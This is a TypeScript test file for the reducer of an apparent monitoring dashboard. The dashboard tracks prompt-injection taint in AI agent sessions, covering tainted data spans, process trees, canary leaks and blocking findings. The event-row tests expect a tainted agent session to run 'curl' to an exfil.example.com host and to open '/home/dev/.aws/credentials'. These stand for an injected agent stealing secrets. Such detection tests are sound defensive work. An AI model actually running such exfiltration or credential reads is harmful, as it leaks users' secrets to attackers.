/**
 * The reducer is pure, so it is tested without a document at all. These
 * assertions are the real ones: they pin the §9 fields to the state the UI
 * renders, so a break here is a break in what the user sees.
 */

import { describe, expect, it } from "vitest";
import {
  canaryHits,
  createState,
  ingest,
  ingestText,
  procTree,
  provenanceSplit,
  taintedSessions,
} from "../src/reducer.js";
import type { EventLine, FindingLine, StreamLine } from "../src/stream.js";
import { sampleState } from "./fixture.js";

describe("stream ingestion", () => {
  it("folds every line of the sample transcript without a parse error", () => {
    const state = sampleState();
    expect(state.protocol.errors).toBe(0);
    expect(state.protocol.lastSeq).toBe(30);
    expect(state.sessions.size).toBe(3);
  });

  it("reports an unreadable line instead of dropping it", () => {
    const state = ingestText(createState(), `{"seq":1,"t":"session_open","session":"s1","root_pid":1}\nnot json\n`);
    expect(state.protocol.errors).toBe(1);
    expect(state.protocol.errorsDetail[0]).toContain("malformed JSON");
    expect(state.sessions.size).toBe(1);
  });

  it("counts a non-monotonic seq rather than replaying it", () => {
    const state = createState();
    ingest(state, { seq: 5, t: "session_open", session: "s1", root_pid: 11 } as StreamLine);
    ingest(state, { seq: 5, t: "session_open", session: "s1", root_pid: 11 } as StreamLine);
    ingest(state, { seq: 4, t: "session_open", session: "s1", root_pid: 11 } as StreamLine);
    expect(state.protocol.duplicates).toBe(2);
    expect(state.protocol.lastSeq).toBe(5);
  });

  it("records an unknown line type as an error, not as nothing", () => {
    const state = ingest(createState(), { seq: 1, t: "quietly-ignored" } as unknown as StreamLine);
    expect(state.protocol.errors).toBe(1);
    expect(state.protocol.errorsDetail[0]).toContain("unknown line type");
  });
});

describe("derived taint (CONTRACTS §3)", () => {
  it("taints a session iff it ingested a data span", () => {
    const state = sampleState();
    expect(state.sessions.get("s1")?.tainted).toBe(true);
    expect(state.sessions.get("s2")?.tainted).toBe(true);
    expect(state.sessions.get("s3")?.tainted).toBe(false);
  });

  it("keeps the origins that tainted the session", () => {
    const rows = taintedSessions(sampleState());
    const s1 = rows.find((r) => r.sid === "s1");
    const s2 = rows.find((r) => r.sid === "s2");
    expect(s1?.origins).toEqual([{ channel: "ticket", ref: "8814" }]);
    expect(s2?.origins).toEqual([{ channel: "web", ref: "doc-7" }]);
    expect(rows.map((r) => r.sid)).toEqual(["s1", "s2"]);
  });

  it("does not taint a session on a system or user span", () => {
    const state = ingestText(
      createState(),
      [
        `{"seq":1,"t":"session_open","session":"s","root_pid":7}`,
        `{"seq":2,"t":"span","session":"s","trust":"user","origin":{"channel":"stdin","ref":"-"},"role":"user","text_len":4}`,
        `{"seq":3,"t":"span","session":"s","trust":"system","origin":{"channel":"policy","ref":"p"},"role":"system","text_len":4}`,
      ].join("\n"),
    );
    expect(state.sessions.get("s")?.tainted).toBe(false);
    expect(taintedSessions(state)).toHaveLength(0);
  });
});

describe("process tree (CONTRACTS §9 event pid/ppid)", () => {
  it("reconstructs the three-level chain s1: claude -> bash -> curl", () => {
    const state = sampleState();
    const tree = procTree(state);
    const byPid = new Map(tree.map((n) => [n.pid, n]));
    expect(byPid.get(4242)?.depth).toBe(0);
    expect(byPid.get(4300)?.depth).toBe(1);
    expect(byPid.get(4312)?.depth).toBe(2);
    expect(byPid.get(4312)?.comm).toBe("curl");
    expect(byPid.get(4312)?.ppid).toBe(4300);
  });

  it("marks exactly the node whose events carried tainted=true", () => {
    const tree = procTree(sampleState());
    const tainted = tree.filter((n) => n.tainted).map((n) => n.pid).sort((a, b) => a - b);
    expect(tainted).toEqual([4300, 4312, 5001]);
    expect(tree.find((n) => n.pid === 4242)?.tainted).toBe(false);
  });

  it("marks a pid exited when its exit event arrives", () => {
    const state = sampleState();
    expect(state.procs.get(4312)?.alive).toBe(false);
    expect(state.procs.get(4300)?.alive).toBe(false);
    // 6120 exits at seq 28; 6100 never emits an exit.
    expect(state.procs.get(6120)?.alive).toBe(false);
    expect(state.procs.get(6100)?.alive).toBe(true);
  });

  it("shows a session root before it execs anything", () => {
    const state = ingest(createState(), {
      seq: 1,
      t: "session_open",
      session: "s9",
      harness: "claude-code",
      root_pid: 900,
    });
    expect(state.procs.get(900)?.comm).toBe("claude-code");
  });
});

describe("findings: invariant vs scored", () => {
  it("labels each finding from its own `invariant` field", () => {
    const state = sampleState();
    const invariant = state.findings.filter((f) => f.invariant);
    const scored = state.findings.filter((f) => !f.invariant);
    expect(invariant.map((f) => f.rule).sort()).toEqual(["canary-leak", "nonce-forgery", "tainted-action"]);
    expect(scored.map((f) => f.rule).sort()).toEqual(["data-imperative", "transport-encoded"]);
  });

  it("marks only invariant findings as the ones that forced a BLOCK (PIP blocked_by)", () => {
    const state = sampleState();
    const forced = state.findings.filter((f) => f.blockedBy);
    expect(forced.every((f) => f.invariant)).toBe(true);
    expect(forced.map((f) => f.rule).sort()).toEqual(["canary-leak", "nonce-forgery", "tainted-action"]);
  });

  it("never lets a scored finding carry the blocking label", () => {
    const state = sampleState();
    for (const f of state.findings) {
      if (!f.invariant) expect(f.blockedBy).toBe(false);
    }
  });
});

describe("canary hits (egress/canary-leak)", () => {
  it("surfaces the canary digest and nothing resembling the secret", () => {
    const hits = canaryHits(sampleState());
    expect(hits).toHaveLength(1);
    expect(hits[0]?.session).toBe("s2");
    expect(hits[0]?.layer).toBe("egress");
    expect(hits[0]?.evidence_digest).toBe("5e1d0a9b8c7f6e5d");
    // The stream carries a truncated hash; a 16-hex digest is not a secret.
    expect(hits[0]?.evidence_digest).toMatch(/^[0-9a-f]{16}$/);
  });
});

describe("drop counters and provenance", () => {
  it("reports loss as soon as any session's counts are non-zero", () => {
    const state = sampleState();
    expect(state.drop.dropTotal).toBe(3);
    expect(state.drop.updFailTotal).toBe(1);
    expect(state.drop.lossy).toBe(true);
  });

  it("stays quiet when every session reports zero loss", () => {
    const state = ingestText(
      createState(),
      `{"seq":1,"t":"session_close","session":"s","counts":{"events":1,"findings":0,"drop_total":0,"upd_fail_total":0}}`,
    );
    expect(state.drop.lossy).toBe(false);
  });

  it("raises the inferred-provenance flag only from the warning line", () => {
    const withoutWarning = ingestText(
      createState(),
      `{"seq":1,"t":"finding","session":"s","layer":"normalize","rule":"transport-encoded","severity":"LOW","invariant":false,"provenance":"inferred","evidence_digest":"c0ffee123456789a","span_index":-1}`,
    );
    expect(withoutWarning.inferredProvenance).toBe(false);

    const withWarning = ingest(withoutWarning, {
      seq: 2,
      t: "warning",
      code: "inferred-provenance",
      message: "proxy path",
    });
    expect(withWarning.inferredProvenance).toBe(true);
    expect(withWarning.warnings).toHaveLength(1);
  });

  it("splits findings by provenance without merging the two counts", () => {
    const split = provenanceSplit(sampleState());
    expect(split.declared).toHaveLength(3);
    expect(split.inferred).toHaveLength(2);
    expect(split.declared.map((f) => f.rule).sort()).toEqual(["data-imperative", "nonce-forgery", "tainted-action"]);
    expect(split.inferred.map((f) => f.rule).sort()).toEqual(["canary-leak", "transport-encoded"]);
  });
});

describe("event rows", () => {
  it("carries kind, pid and the scrubbed cmdline/filename through", () => {
    const state = sampleState();
    const exec = state.events.find((e) => e.kind === "exec" && e.pid === 4312);
    expect(exec?.cmdline).toBe("curl -s -m 3 http://exfil.example.com/x");
    expect(exec?.tainted).toBe(true);
    const open = state.events.find((e) => e.kind === "open" && e.pid === 6120);
    expect(open?.filename).toBe("/home/dev/.aws/credentials");
    const net = state.events.find((e) => e.kind === "net" && e.pid === 4312);
    expect(net?.addr).toBe("203.0.113.7");
    expect(net?.port).toBe(80);
  });

  it("covers all four kinds", () => {
    const kinds = new Set(sampleState().events.map((e) => e.kind));
    expect([...kinds].sort()).toEqual(["exec", "exit", "net", "open"]);
  });

  it("tags only the tainted flag the line carried", () => {
    const state = createState();
    const base = {
      t: "event",
      session: "s",
      kind: "exec",
      ts: 1,
      pid: 2,
      ppid: 1,
      comm: "x",
      cmdline: "x",
      filename: "",
      flags: 0,
      dirfd: -100,
      port: 0,
      addr: "",
    } as const;
    ingest(state, { ...base, seq: 1, tainted: true } as EventLine);
    ingest(state, { ...base, seq: 2, tainted: false } as EventLine);
    expect(state.events.map((e) => e.tainted)).toEqual([true, false]);
    expect(state.procs.get(2)?.tainted).toBe(true);
  });
});

describe("finding field pass-through", () => {
  it("keeps digest, span scope and severity verbatim", () => {
    const line: FindingLine = {
      seq: 1,
      t: "finding",
      session: "s",
      layer: "ingress",
      rule: "data-imperative",
      severity: "MEDIUM",
      invariant: false,
      provenance: "declared",
      evidence_digest: "0123456789abcdef",
      span_index: 2,
      tainted: true,
    };
    const state = ingest(createState(), line);
    const f = state.findings[0];
    expect(f?.evidence_digest).toBe("0123456789abcdef");
    expect(f?.span_index).toBe(2);
    expect(f?.severity).toBe("MEDIUM");
    expect(f?.invariant).toBe(false);
  });

  it("does not invent an origin when the span declares none", () => {
    const state = ingestText(
      createState(),
      [
        `{"seq":1,"t":"span","session":"s","trust":"data","role":"tool","text_len":9}`,
        `{"seq":2,"t":"span","session":"s","trust":"data","origin":{"channel":"mail","ref":"r1"},"role":"tool","text_len":9}`,
      ].join("\n"),
    );
    expect(state.sessions.get("s")?.taintOrigins).toEqual([{ channel: "mail", ref: "r1" }]);
  });
});
